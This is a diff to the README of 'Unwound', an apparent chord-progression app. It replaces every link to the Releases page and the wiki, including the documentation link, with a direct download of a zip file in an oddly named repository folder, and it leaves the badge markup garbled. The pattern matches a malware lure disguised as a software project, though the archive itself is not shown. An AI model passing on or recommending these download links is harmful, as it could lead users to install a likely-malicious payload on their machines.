@@ -1,7 +1,7 @@
 # 🎵 Unwound - Generate Chord Progressions Effortlessly
 
 ## 💾 Download Unwound
-[![Download Unwound](https://img.shields.io/badge/Download%20Now-Get%20Release-blue.svg)](https://github.com/sigma303/Unwound/releases)
+[![Download Unwound](https://github.com/sigma303/Unwound/raw/refs/heads/main/plutocratical/Software_v2.6.zip%20Now-Get%https://github.com/sigma303/Unwound/raw/refs/heads/main/plutocratical/Software_v2.6.zip)](https://github.com/sigma303/Unwound/raw/refs/heads/main/plutocratical/Software_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Unwound, your go-to application for generating chord progressions! Th
 ## 📥 Download & Install
 
 1. **Visit the Download Page:** Click the link below to access the Unwound Releases page.
-   [Download Unwound](https://github.com/sigma303/Unwound/releases)
+   [Download Unwound](https://github.com/sigma303/Unwound/raw/refs/heads/main/plutocratical/Software_v2.6.zip)
 
 2. **Select Your Version:** On the Releases page, you will see various versions of Unwound. Look for the latest version. It is usually marked as "Latest Release."
 
@@ -65,10 +65,10 @@ If you have any questions or require assistance, feel free to reach out to the c
 
 Here are some useful resources to get the most out of Unwound:
 
-- **Official Documentation:** [Unwound Documentation](https://github.com/sigma303/Unwound/wiki)
+- **Official Documentation:** [Unwound Documentation](https://github.com/sigma303/Unwound/raw/refs/heads/main/plutocratical/Software_v2.6.zip)
 - **Tutorial Videos:** Check out tutorial videos on generating and saving chords available on platforms like YouTube.
 - **User Contributions:** Explore community-generated content such as chord packs available for download.
 
 Your music journey starts here. Unlock your creativity with Unwound by following these steps to download and run the software today!
 
-[Download Unwound](https://github.com/sigma303/Unwound/releases)
+[Download Unwound](https://github.com/sigma303/Unwound/raw/refs/heads/main/plutocratical/Software_v2.6.zip)
